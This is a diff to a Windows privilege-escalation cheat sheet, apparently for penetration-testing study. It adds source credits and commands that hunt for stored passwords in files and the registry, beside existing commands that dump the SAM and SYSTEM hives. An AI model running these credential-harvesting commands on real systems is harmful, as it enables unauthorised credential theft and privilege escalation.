@@ -1,4 +1,4 @@
-# Windows Privilege Escalation tools to help me get system access.
+# Windows Privilege Escalation tools to help me get system access. Majority of these privilege escalation tactics come from the list of great resources below. I do not take credit for any of these.
 
 
 ## GREAT Privesc Resources
@@ -20,6 +20,7 @@ https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
 https://oscp.securable.nl/privilege-escalation
 
 http://www.fuzzysecurity.com/tutorials/16.html
+
 
 ### [Windows-Privesc-Check]
 
@@ -90,6 +91,10 @@ cmd /c systeminfo
 reg.exe save hklm\sam c:\sam_backup
 reg.exe save hklm\security c:\security_backup
 reg.exe save hklm\system c:\system
+dir /s *pass* == *cred* == *vnc* == *.config*
+findstr /si password *.xml *.ini *.txt
+C:\Windows\system32> reg query HKLM /f password /t REG_SZ /s
+C:\Windows\system32> reg query HKCU /f password /t REG_SZ /s
 ```
 
 ### [Enumerate Windows Autologon Creds]
